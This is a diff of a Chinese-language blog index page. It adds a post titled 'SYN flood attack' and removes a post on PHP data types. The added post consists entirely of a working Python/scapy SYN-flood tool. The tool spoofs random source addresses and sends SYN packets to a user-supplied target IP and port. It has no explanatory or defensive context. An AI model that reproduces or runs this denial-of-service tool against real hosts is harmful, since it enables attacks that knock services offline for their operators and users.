@@ -169,6 +169,64 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-SYNgj" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/SYNgj/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/SYNgj/">
+        SYN洪泛攻击
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SYN洪泛攻击"><a href="#SYN洪泛攻击" class="headerlink" title="SYN洪泛攻击"></a>SYN洪泛攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成随机的IP</span><br><span class="line">def randomIP():</span><br><span class="line">    ip = &quot;.&quot;.join(map(str, (random.randint(0, 255) for i in range(4))))</span><br><span class="line">    return ip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成随机端口</span><br><span class="line">def randomPort():</span><br><span class="line">    port = random.randint(1000, 10000)</span><br><span class="line">    return port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># syn-flood</span><br><span class="line">def synFlood(count, dstIP, dstPort):</span><br><span class="line">    total = 0</span><br><span class="line">    print(&quot;Packets are sending ...&quot;)</span><br><span class="line">    for i in range(count):</span><br><span class="line">        # IPlayer</span><br><span class="line">        srcIP = randomIP()</span><br><span class="line">        dstIP = dstIP</span><br><span class="line">        IPlayer = IP(src=srcIP, dst=dstIP)</span><br><span class="line">        # TCPlayer</span><br><span class="line">        srcPort = randomPort()</span><br><span class="line">        TCPlayer = TCP(sport=srcPort, dport=dstPort, flags=&quot;S&quot;)</span><br><span class="line">        # 发送包</span><br><span class="line">        packet = IPlayer / TCPlayer</span><br><span class="line">        send(packet)</span><br><span class="line">        total += 1</span><br><span class="line">    print(&quot;Total packets sent: %i&quot; % total)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 显示的信息</span><br><span class="line">def info():</span><br><span class="line">    print(&quot;#&quot; * 30)</span><br><span class="line">    print(&quot;# Welcome to SYN Flood Tool  #&quot;)</span><br><span class="line">    print(&quot;#&quot; * 30)</span><br><span class="line">    # 输入目标IP和端口</span><br><span class="line">    dstIP = input(&quot;Target IP : &quot;)</span><br><span class="line">    dstPort = int(input(&quot;Target Port : &quot;))</span><br><span class="line">    return dstIP, dstPort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    dstIP, dstPort = info()</span><br><span class="line">    count = int(input(&quot;Please input the number of packets：&quot;))</span><br><span class="line">    synFlood(count, dstIP, dstPort)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-PHP反序列化之pop链查找" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -972,95 +1030,6 @@ echo strcmp($_GET['ret'],'wer');
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-php数据类型" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/php%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/">
-        php数据类型
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="PHP数据类型"><a href="#PHP数据类型" class="headerlink" title="PHP数据类型"></a>PHP数据类型</h1><p>String(字符串）<br>lnteger(整型）<br>Float(浮点型）<br>Boolean(布尔型）<br>array(数组型）<br>Object(对象）<br>NUll(空值)</p>
-<h2 id="字符串型（string）"><a href="#字符串型（string）" class="headerlink" title="字符串型（string）"></a>字符串型（string）</h2><p>可以将字符串放在单引号和双引号中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$x = &quot;Hello world!&quot;;</span><br><span class="line">echo $x;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">$x = &#x27;Hello world!&#x27;;</span><br><span class="line">echo $x;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="PHP-整型"><a href="#PHP-整型" class="headerlink" title="PHP 整型"></a>PHP 整型</h2><ol>
-<li>整型可以用三种格式表示：十进制、十六进制和八进制</li>
-<li>var_dump()函数返回变量的数据类型和值，如果变量不存在，则输出NULL<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$x = 5985;</span><br><span class="line">var_dump($x);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">$x = -345; // 负数 </span><br><span class="line">var_dump($x);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">$x = 0x8C; // 十六进制数</span><br><span class="line">var_dump($x);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$x = 047; // 八进制数</span><br><span class="line">var_dump($x);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="PHP浮点型"><a href="#PHP浮点型" class="headerlink" title="PHP浮点型"></a>PHP浮点型</h2><p>浮点数就是带小数部分的数字，或是指数形式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$x = 10.365;</span><br><span class="line">var_dump($x);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">$x = 2.4e3;</span><br><span class="line">var_dump($x);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;; </span><br><span class="line">$x = 8E-5;</span><br><span class="line">var_dump($x);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="PHP布尔型"><a href="#PHP布尔型" class="headerlink" title="PHP布尔型"></a>PHP布尔型</h2><p>布尔型可以是TURE或FALSE</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$x=ture;</span><br><span class="line">$y=false;</span><br></pre></td></tr></table></figure>
-
-<h2 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h2><p>数组可以在一个变量中存储多个值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line">var_dump($cars);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="PHP对象"><a href="#PHP对象" class="headerlink" title="PHP对象"></a>PHP对象</h2><ol>
-<li>对象数据类型也可以用于存储数据</li>
-<li>注意点：（1）必须使用class关键字声明类对象，类是可以包含属性和方法的结构<pre><code>         （2）在类中定义数据类型，然后在实例化的类中使用数据类型
-</code></pre>
-</li>
-<li>下例的this是指向当前对象实例的指针，不指向任何其他对象或类<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Car</span><br><span class="line">&#123;</span><br><span class="line">    var $color;</span><br><span class="line">    function __construct($color=&quot;green&quot;) &#123;</span><br><span class="line">      $this-&gt;color = $color;</span><br><span class="line">    &#125;</span><br><span class="line">    function what_color() &#123;</span><br><span class="line">      return $this-&gt;color;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function print_vars($obj) &#123;</span><br><span class="line">   foreach (get_object_vars($obj) as $prop =&gt; $val) &#123;</span><br><span class="line">     echo &quot;\t$prop = $val\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 实例一个对象</span><br><span class="line">$herbie = new Car(&quot;white&quot;);</span><br><span class="line"></span><br><span class="line">// 显示 herbie 属性</span><br><span class="line">echo &quot;\therbie: Properties\n&quot;;</span><br><span class="line">print_vars($herbie);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="PHP-NULL值"><a href="#PHP-NULL值" class="headerlink" title="PHP NULL值"></a>PHP NULL值</h2><p>NULL值表示变量没有值，NULL是数据类型为NULL的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$x=&quot;Hello world!&quot;;</span><br><span class="line">$x=null;</span><br><span class="line">var_dump($x);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E7%89%B9%E6%80%A7/" rel="tag">php特性</a></li></ul>
 	</div>
 
       
